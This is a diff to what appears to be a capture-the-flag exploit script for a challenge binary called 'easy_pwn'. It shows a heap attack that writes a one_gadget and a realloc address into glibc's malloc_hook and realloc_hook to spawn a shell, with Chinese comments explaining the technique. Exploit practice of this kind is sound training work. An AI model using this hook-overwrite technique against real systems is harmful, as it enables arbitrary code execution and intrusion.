@@ -7,7 +7,7 @@ from struct import pack
 from qwq import *
 import os
 loader = Loader("target/easy_pwn", 64)
-loader.patchElf(buu=True)
+loader.patchElf()
 # loader.debug()
 
 log = nan
@@ -32,9 +32,8 @@ if 1:
 
 io = loader.process(0)
 # io = loader.remote(27297)
-os.system(f'echo "att {io.pid}" | clip.exe')
+# os.system(f'echo "att {io.pid}" | clip.exe')
 elf = loader.elf
-# loader.patchElf()
 
 
 def main():
@@ -89,10 +88,15 @@ def main():
     add(0x60) # 6
     # 拿malloc-0x23(fake)是为了向malloc_hook中放入one_gadget
     # 但是one_gadget不是随便就能用的，不满足限制条件的话就需要借助realloc_hook
+    
+    # malloc_hook 里面放 realloc
+    # realloc_hook 里面放 one_gadget
+    # realloc_hook = malloc_hook - 8
+    one_gadget = libc_base + 0x4527a
     payload = b"\x00"*11 + p64(one_gadget)+ p64(realloc+2)
     edit(6,len(payload),payload)
     pause()
-    add(255)
+    add(255) 
 
     shell()
     
